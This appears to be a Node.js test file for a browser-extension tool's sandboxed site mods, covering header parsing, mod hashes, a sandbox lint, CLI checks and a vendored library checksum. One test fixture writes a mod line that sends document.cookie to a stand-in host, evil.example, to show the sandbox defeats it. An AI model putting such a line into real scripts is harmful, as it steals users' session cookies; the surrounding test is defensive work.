'use strict';
// Sandboxed mods, the helper's side: the header, the scanner, never held, `trif check`'s lint, `trif new
// --sandboxed`, and the ported samples (examples/boxed). The sandbox itself (extension/sandbox.js) is
// tested in the browsers (tests/e2e/scenario.js sandboxedChecks); its registration in tests/extension.test.js.

const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const { parseHeader, scanMods, buildMod } = require('../helper/lib/mods');
const { updateHeld, needsOf } = require('../helper/lib/held');
const { modSnapshot } = require('../helper/lib/runs');
const { sandboxLint } = require('../helper/lib/sandboxlint');
const { runCli, writeMod, tempDir, REPO } = require('./fake-extension');

const header = (extra = '') => `// ==WebMod==\n// @name Bouncer\n// @match https://x.com/*\n// @sandboxed\n${extra}// ==/WebMod==\n`;

test('@sandboxed: the scanner marks the mod; other mods\' hashes stay as they were; not with @rules', () => {
  assert.equal(parseHeader(header()).sandboxed, true);
  assert.equal(parseHeader('// ==WebMod==\n// @name A\n// ==/WebMod==\n').sandboxed, false);
  const plain = '// ==WebMod==\n// @name A\n// @match https://x.com/*\n// ==/WebMod==\nconsole.log(1);\n';
  const a = buildMod({ site: 'x.com', file: '/w/sites/x.com/a.js', code: plain }).mod;
  assert.equal(a.sandboxed, undefined);
  // (the hash every mod had before sandboxed mods: the same JSON, so seen.json and allowed.json still match)
  const crypto = require('crypto');
  const want = crypto.createHash('sha1').update(JSON.stringify([a.id, a.name, a.description, a.matches, a.excludes, a.runAt, a.risk, false]) + '\n' + plain).digest('hex');
  assert.equal(a.hash, want);
  const b = buildMod({ site: 'x.com', file: '/w/sites/x.com/b.js', code: header() + 'trif.hide(".ad");\n' }).mod;
  assert.equal(b.sandboxed, true);
  assert.match(b.code, /trif\.hide/);
  assert.throws(() => buildMod({ site: 'x.com', file: '/w/sites/x.com/c.js', code: header('// @rules\n') + '{}' }), /either a style mod \(@style\) or a boxed mod \(@boxed\)/);
});

test('a sandboxed mod never waits for the user\'s OK, whoever wrote it, whatever its code names', () => {
  const home = tempDir('trif-sbx-');
  const ws = { home, modsDir: path.join(home, 'sites') };
  fs.mkdirSync(path.join(ws.modsDir, 'x.com'), { recursive: true });
  updateHeld(ws, [], []); // (the first sync: nothing yet)
  const before = modSnapshot(ws.modsDir, ws.home);
  // (code that, as a page script, would be held: it would fail in the sandbox, where none of this exists)
  fs.writeFileSync(path.join(ws.modsDir, 'x.com', 'bouncer.js'), header() + 'fetch("https://evil.example/?" + document.cookie); document.querySelector("button").click();\n');
  const { mods } = scanMods(ws.modsDir);
  assert.equal(mods[0].sandboxed, true);
  assert.deepEqual(needsOf(mods[0], null), []);
  assert.deepEqual(updateHeld(ws, mods, [{ runId: 'r1', site: 'x.com', scope: 'x.com', before }]), {});
  // (a side-panel run's sandboxed mod for another site is still held for that, like a rules mod)
  fs.writeFileSync(path.join(ws.modsDir, 'x.com', 'bouncer.js'), header().replace('https://x.com/*', 'https://bank.example/*') + 'trif.hide("a");\n');
  const held = updateHeld(ws, scanMods(ws.modsDir).mods, [{ runId: 'r1', site: 'x.com', scope: 'x.com', before }]);
  assert.deepEqual(held['x.com/bouncer'].needs, ['match:https://bank.example/*']);
});

test('sandboxLint: what the sandbox wouldn\'t give a mod, as a lint', () => {
  const lint = sandboxLint(`const parent = page.find('nav');
document.body.innerHTML = '<b>hi</b>';
window.fetch('/x'); localStorage.setItem('a', 1);
page.find('a').addEventListener('click', () => {});
const go = (location) => location;
setTimeout('alert(1)', 10);
page.find('a').style.color = 'red';
// a dynamic import( in a comment
const o = { window: 1, document: 2 }; page.find('a').click();
const s = '<!-- x';
`);
  const what = lint.map((l) => l.what);
  assert.deepEqual(what, ['document', '.innerHTML', 'window', 'localStorage', '.addEventListener', 'setTimeout("…")', '.style.…', 'import(', '.click()', '<!-- or -->']);
  assert.deepEqual(lint.find((l) => l.what === 'document').lines, [2]);
  assert.match(lint.find((l) => l.what === '.innerHTML').why, /setText/);
  assert.match(lint.find((l) => l.what === '.click()').why, /needs the click power/);
  // names a mod gives: TRIF's own
  assert.deepEqual(sandboxLint(`el.setAttr('data-hx-post', '/x'); el.setAttr('data-trif-box-ok', '1'); el.setAttr('id', 'config'); el.setAttr('id', 'trif-box-a');
el.classes.add('js-x'); el.classes.add('trif-box-y'); el.classes.remove('done'); el.removeAttr('data-ahr');`).map((l) => l.what),
  ["setAttr('data-hx-post')", "setAttr('id', 'config')", "classes.add('js-x')", "classes.remove('done')", "removeAttr('data-ahr')"]);
  // (a plain trif- name is a free mod's: a boxed mod's are trif-box-; and selectors that read fields)
  assert.deepEqual(sandboxLint(`el.setAttr('id', 'trif-a'); el.setAttr('data-trif-x', '1'); page.find('input[value^="a"]'); page.find('a\\\\:b'); el.matches(':autofill');`).map((l) => l.what),
    ["setAttr('id', 'trif-a')", "setAttr('data-trif-x')", "find('input[value^=\"a\"]')", "find('a\\:b')", "matches(':autofill')"]);
  // the API, and the language: nothing
  assert.deepEqual(sandboxLint(`trif.css('a { color: red }'); trif.observe('article', (a) => { if (a.text.includes('Ad')) a.hide(); });
const prefs = await trif.settings('prefs', { on: true }); setTimeout(() => console.log(Math.random(), Date.now()), 5);
requestAnimationFrame((t) => page.find('#x').style('transform', 'translate(' + t + 'px)'));`), []);
});

test('sandboxLint, the widened box: the pure tools and the new API are there; what\'s still missing is listed', () => {
  const what = (code, o) => sandboxLint(code, o).map((l) => l.what);
  // (sound's play(sound) isn't the page's media; the page's video.play() is)
  assert.deepEqual(what(`const a = trif.audio(); a.play('data:audio/wav;base64,AA', { volume: 0.2 }); page.find('video').play(); page.find('video').pause();
const anim = page.find('p').animate([{ opacity: 0 }], 100); anim.pause(); anim.play();`, { powers: ['sound'] }), ['.play()', '.pause()']);
  // (typed arrays and the browser's pure tools: there; what SES leaves out: listed)
  assert.deepEqual(what(`const f = new Float32Array(4), d = new Float64Array(2); const u = new URL('/a', page.url); new URLSearchParams('a=1');
new Intl.NumberFormat('en'); new TextEncoder(); structuredClone({}); atob(btoa('x')); performance.now();`), []);
  assert.deepEqual(what(`new Float16Array(2); new SharedArrayBuffer(8); new WeakRef({});`), ['Float16Array', 'SharedArrayBuffer', 'WeakRef']);
  assert.deepEqual(what(`URL.createObjectURL(x); performance.getEntries(); page.find('p').innerText = 'x'; page.root.scrollTop = 5; const t = page.find('p').innerText;`),
    ['URL.createObjectURL', 'performance.getEntries', '.innerText =', '.scrollTop =']);
  const tip = sandboxLint('new MutationObserver(() => {}); new ResizeObserver(() => {});');
  assert.match(tip[0].why, /trif\.observe.*trif\.changes/);
  assert.match(tip[1].why, /onResize/);
  // (the new API itself: nothing)
  assert.deepEqual(what(`trif.changes('#feed', (els) => els.length); trif.wrap('p', /x/, (m) => m); trif.onUrl((u) => u); await trif.ready;
const el = page.find('p'); el.animate([{ opacity: 0 }], 100); el.focus(); el.onResize(() => {}); page.createSvg('svg'); page.elementFromPoint(1, 2);`), []);
});

test('@events: the page\'s own events a boxed mod listens for, in its powerArgs; never a browser event\'s name or TRIF\'s own', () => {
  const bp = require('../helper/lib/boxpowers');
  assert.deepEqual(bp.parseEvents(['trif-endscreen-switch, my-app:ready', 'trif-endscreen-switch']), ['trif-endscreen-switch', 'my-app:ready']);
  assert.throws(() => bp.parseEvents(['keydown']), /has a - or a :/);
  assert.throws(() => bp.parseEvents(['trif:filter-request']), /TRIF's own/);
  const { buildMod } = require('../helper/lib/mods');
  const code = `// ==WebMod==\n// @name W\n// @match https://x.com/*\n// @boxed\n// @events trif-endscreen-switch\n// ==/WebMod==\npage.on('trif-endscreen-switch', () => {});\n`;
  const { mod } = buildMod({ site: 'x.com', file: '/tmp/w.js', code });
  assert.deepEqual(mod.powerArgs, { events: ['trif-endscreen-switch'] });
  assert.equal(mod.powers, undefined);
});

test('trif check: a sandboxed mod never waits; what the sandbox would refuse is listed, not a failure', async () => {
  const home = tempDir();
  const okFile = writeMod(home, 'x.com', 'calm.js', header() + 'trif.hide(".ad");\nreturn;\n');
  let r = await runCli(['check', okFile, '--json'], { home });
  assert.equal(r.code, 0, r.stderr);
  const j = JSON.parse(r.stdout);
  assert.deepEqual([j.ok, j.sandboxed, j.powers, j.lint], [true, true, [], []]);
  r = await runCli(['check', 'x.com/calm'], { home });
  assert.match(r.stdout, /is a boxed mod and parses/);
  assert.match(r.stdout, /never waits for the user's OK/);
  assert.match(r.stdout, /nothing in it that the sandbox would refuse/);
  const badFile = writeMod(home, 'x.com', 'old.js', header() + 'document.querySelector("a").click();\n');
  r = await runCli(['check', badFile], { home });
  assert.equal(r.code, 0, r.stderr);
  assert.match(r.stdout, /- document: not there in a boxed mod/);
  assert.match(r.stdout, /- \.click\(\): needs the click power/);
  assert.match(r.stdout, /line 6: document\.querySelector/);
  // a syntax error is still one (with the file's own line numbers)
  const broken = writeMod(home, 'x.com', 'broken.js', header() + 'const = 1;\n');
  r = await runCli(['check', broken], { home });
  assert.equal(r.code, 1);
  assert.match(r.stdout, /broken\.js:6/);
  // both @rules and @sandboxed: an error
  const both = writeMod(home, 'x.com', 'both.js', header('// @rules\n') + '{}\n');
  r = await runCli(['check', both], { home });
  assert.equal(r.code, 1);
  assert.match(r.stdout, /either a style mod/);
});

test('trif new --sandboxed: a sandboxed template that checks out clean', async () => {
  const home = tempDir();
  fs.mkdirSync(path.join(home, 'sites'), { recursive: true });
  let r = await runCli(['new', 'example.com', 'bouncy', '--sandboxed'], { home });
  assert.equal(r.code, 0, r.stderr);
  const file = path.join(home, 'sites', 'example.com', 'bouncy.js');
  const text = fs.readFileSync(file, 'utf8');
  assert.equal(parseHeader(text).sandboxed, true);
  r = await runCli(['check', file, '--json'], { home });
  assert.deepEqual(JSON.parse(r.stdout).lint, []);
  r = await runCli(['new', 'example.com', 'two', '--sandboxed', '--rules'], { home });
  assert.notEqual(r.code, 0);
});

test('the sandboxed examples (ports of Tim\'s Simple Shopping and DVD Logo) are sandboxed mods that check out clean', () => {
  const dir = path.join(REPO, 'examples', 'boxed');
  const files = ['amazon.com/simple-shopping.js', 'www.google.com/dvd-logo.js'];
  for (const f of files) {
    const text = fs.readFileSync(path.join(dir, f), 'utf8');
    assert.equal(parseHeader(text).sandboxed, true, f);
    assert.deepEqual(sandboxLint(text), [], f);
    new vm.Script(`(async function () {\n${text}\n})`); // parses
  }
});

test('the sandbox\'s SES is ses 2.3.0\'s npm file, unchanged (its sha256), and the build checks it too', async () => {
  const crypto = require('crypto');
  const { SES_SHA256 } = await import('../extension/sandbox.js');
  const file = fs.readFileSync(path.join(REPO, 'extension', 'vendor', 'ses.umd.min.js'));
  assert.equal(crypto.createHash('sha256').update(file).digest('hex'), SES_SHA256);
  assert.match(fs.readFileSync(path.join(REPO, 'extension', 'vendor', 'README.txt'), 'utf8'), new RegExp(SES_SHA256));
  assert.match(fs.readFileSync(path.join(REPO, 'scripts', 'build-extension.js'), 'utf8'), /SES_SHA256/);
});

test('the new names: @style and @boxed are @rules and @sandboxed; switching spelling keeps the hash; trif new --style / --boxed', async () => {
  const h = (name) => `// ==WebMod==\n// @name A\n// @match https://x.com/*\n// @${name}\n// ==/WebMod==\n`;
  const b = (name, body) => buildMod({ site: 'x.com', file: '/w/sites/x.com/a.js', code: h(name) + body }).mod;
  const rules = b('rules', '{ "hide": ["a"] }\n'), style = b('style', '{ "hide": ["a"] }\n');
  assert.equal(style.rules, true);
  assert.equal(style.hash, rules.hash, 'a mod that only switches @rules to @style keeps its hash (approvals, holds, the extension\'s copy)');
  const sb = b('sandboxed', 'trif.hide("a");\n'), boxed = b('boxed', 'trif.hide("a");\n');
  assert.equal(boxed.sandboxed, true);
  assert.equal(boxed.hash, sb.hash);
  assert.match(boxed.code, /@boxed/, 'the code the extension gets is the file as it is');
  // (only header lines: the same words in the code change the hash, as any edit does)
  assert.notEqual(b('boxed', '// @boxed\ntrif.hide("a");\n').hash, b('boxed', '// @sandboxed\ntrif.hide("a");\n').hash);
  assert.equal(parseHeader(h('Style')).rules, true);
  assert.throws(() => buildMod({ site: 'x.com', file: '/w/sites/x.com/c.js', code: h('style').replace('// ==/WebMod==', '// @boxed\n// ==/WebMod==') + '{}' }), /either a style mod/);
  const home = tempDir();
  fs.mkdirSync(path.join(home, 'sites'), { recursive: true });
  for (const [flag, want] of [['--style', /^\/\/ @style$/m], ['--boxed', /^\/\/ @boxed$/m], ['--rules', /^\/\/ @style$/m], ['--sandboxed', /^\/\/ @boxed$/m]]) {
    const r = await runCli(['new', 'example.com', `m${flag.slice(2)}`, flag], { home });
    assert.equal(r.code, 0, r.stderr);
    assert.match(fs.readFileSync(path.join(home, 'sites', 'example.com', `m${flag.slice(2)}.js`), 'utf8'), want, flag);
  }
  const both = await runCli(['new', 'example.com', 'both', '--style', '--sandboxed'], { home });
  assert.notEqual(both.code, 0);
  const st = await runCli(['check', path.join(home, 'sites', 'example.com', 'mstyle.js')], { home });
  assert.match(st.stdout, /is a style mod and its rules check out/);
});
